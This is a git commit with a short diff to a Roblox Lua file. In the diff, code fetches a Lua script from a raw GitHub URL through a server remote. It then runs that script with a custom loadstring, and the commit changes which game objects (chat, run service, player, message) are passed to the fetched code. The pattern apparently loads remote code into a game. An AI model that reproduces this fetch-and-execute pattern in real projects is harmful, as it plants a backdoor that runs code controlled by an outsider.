38f84f3aaef60b583ed327dd6a99351fb153f14e
REGRRETGETMEOUTOFUHJAUHHEREPLEASE-23....- <superegglauncher@gmail.com>
2025-04-29 10:27:35 +0300

    data

--- u.lua
+++ u.lua
@@ -110,7 +110,7 @@ print("ui stuff:", forcingthechat, run, player, message, playere)
 		local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
 		local loadstrng = game:GetService("ReplicatedStorage"):WaitForChild("gethttp", 99999):InvokeServer("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/l.lua")
 
-		local localscripts = loadstring(loadstrng)(...)
+		local localscripts = loadstring(loadstrng)(forcingthechat, run, player, message)
 
 		localscripts.init(forcingthechat, run, player, message)
 	]]
